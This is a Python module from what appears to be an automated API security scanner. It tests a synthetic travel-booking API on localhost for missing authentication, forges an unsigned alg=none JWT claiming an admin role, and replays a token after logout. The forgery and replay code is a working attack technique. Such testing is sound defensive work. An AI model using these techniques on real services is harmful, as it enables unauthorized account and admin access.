"""Auth & Session Executor: unauthenticated access, JWT alg=none forgery, logged-out token reuse."""

from __future__ import annotations

import base64
import json
import time
import uuid

import httpx

from agents.planner import AssertionOracle, AttackTask, CandidateFinding, HttpStepSpec
from safety.gateway import SafeAsyncClient, SafetyGateway


def _forged_alg_none_jwt() -> str:
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = (
        base64.urlsafe_b64encode(
            json.dumps(
                {
                    "sub": "alpha_admin@synthetic-travel.test",
                    "user_id": "USR-ALPHA-1",
                    "agency_id": "AGENCY_ALPHA",
                    "role": "admin",
                    "exp": int(time.time()) + 3600,
                }
            ).encode()
        )
        .rstrip(b"=")
        .decode()
    )
    return f"{header}.{payload}."


class AuthExecutor:
    """Tests missing authentication, JWT alg=none tampering, and revoked-token reuse."""

    name = "auth"

    def __init__(
        self,
        gateway: SafetyGateway,
        base_url: str = "http://127.0.0.1:8001",
        async_transport: httpx.AsyncBaseTransport | None = None,
    ) -> None:
        self.gateway = gateway
        self.base_url = base_url.rstrip("/")
        self._async_transport = async_transport

    async def execute(self, task: AttackTask) -> list[CandidateFinding]:
        candidates: list[CandidateFinding] = []
        path = task.canonical_path
        sample_path = path.replace("{id}", "1001")

        # 1. Unauthenticated access check on protected / zombie / shadow GET endpoints
        if task.method == "GET" and any(
            k in path for k in ("/bookings/", "/internal/", "/v1/", "/users/")
        ):
            async with SafeAsyncClient(
                self.gateway,
                agent="executor_auth",
                actor="unauthenticated",
                pace=True,
                inner_transport=self._async_transport,
            ) as unauth_client:
                resp = await unauth_client.get(f"{self.base_url}{sample_path}")
                if resp.status_code == 200:
                    vuln_class = "Zombie and shadow APIs" if ("/v1/" in path or "/internal/" in path) else "Authentication and sessions"
                    candidates.append(
                        CandidateFinding(
                            candidate_id=f"CAND-{uuid.uuid4().hex[:8].upper()}",
                            vuln_class=vuln_class,
                            executor="auth",
                            canonical_endpoint=path,
                            method="GET",
                            affected_parameter="Authorization",
                            title=f"Unauthenticated Access to {path}",
                            summary=f"Endpoint {sample_path} returned HTTP 200 without authentication.",
                            exploit_step=HttpStepSpec(method="GET", path=sample_path, actor="unauthenticated"),
                            oracle=AssertionOracle(
                                oracle_type="zombie_unauth" if ("/v1/" in path or "/internal/" in path) else "unauth_access",
                            ),
                        )
                    )

                # 2. JWT alg=none check
                forged = _forged_alg_none_jwt()
                jwt_resp = await unauth_client.get(
                    f"{self.base_url}{sample_path}",
                    headers={"Authorization": f"Bearer {forged}"},
                )
                if jwt_resp.status_code == 200 and resp.status_code in (401, 403):
                    candidates.append(
                        CandidateFinding(
                            candidate_id=f"CAND-{uuid.uuid4().hex[:8].upper()}",
                            vuln_class="Authentication and sessions",
                            executor="auth",
                            canonical_endpoint=path,
                            method="GET",
                            affected_parameter="Authorization",
                            title=f"JWT alg=none Accepted on {path}",
                            summary="Endpoint accepted unsigned JWT with alg=none.",
                            baseline_step=HttpStepSpec(method="GET", path=sample_path, actor="unauthenticated"),
                            exploit_step=HttpStepSpec(
                                method="GET",
                                path=sample_path,
                                actor="unauthenticated",
                                headers={"Authorization": f"Bearer {forged}"},
                            ),
                            oracle=AssertionOracle(oracle_type="jwt_tamper"),
                        )
                    )

        # 3. Logged-out token reuse on /api/v3/bookings/1001
        if path == "/api/v3/bookings/{id}" and task.method == "GET":
            async with SafeAsyncClient(
                self.gateway,
                agent="executor_auth",
                actor="agency_a_subagent",
                pace=True,
                inner_transport=self._async_transport,
            ) as sub_client:
                logout_resp = await sub_client.post(f"{self.base_url}/api/v3/auth/logout")
                if logout_resp.status_code == 200:
                    # Replay with the same cached token before clearing it from vault
                    reuse_resp = await sub_client.get(f"{self.base_url}/api/v3/bookings/1001")
                    self.gateway.vault.clear_token("agency_a_subagent")
                    if reuse_resp.status_code == 200:
                        candidates.append(
                            CandidateFinding(
                                candidate_id=f"CAND-{uuid.uuid4().hex[:8].upper()}",
                                vuln_class="Authentication and sessions",
                                executor="auth",
                                canonical_endpoint=path,
                                method="GET",
                                affected_parameter="Authorization",
                                title="Logged-out JWT Token Remains Valid on Replay",
                                summary="Revoked bearer token still granted access after POST /api/v3/auth/logout.",
                                exploit_step=HttpStepSpec(
                                    method="GET",
                                    path="/api/v3/bookings/1001",
                                    actor="agency_a_subagent",
                                ),
                                oracle=AssertionOracle(oracle_type="token_reuse"),
                                setup_context={"flow": "revoked_token_replay"},
                            )
                        )

        return candidates
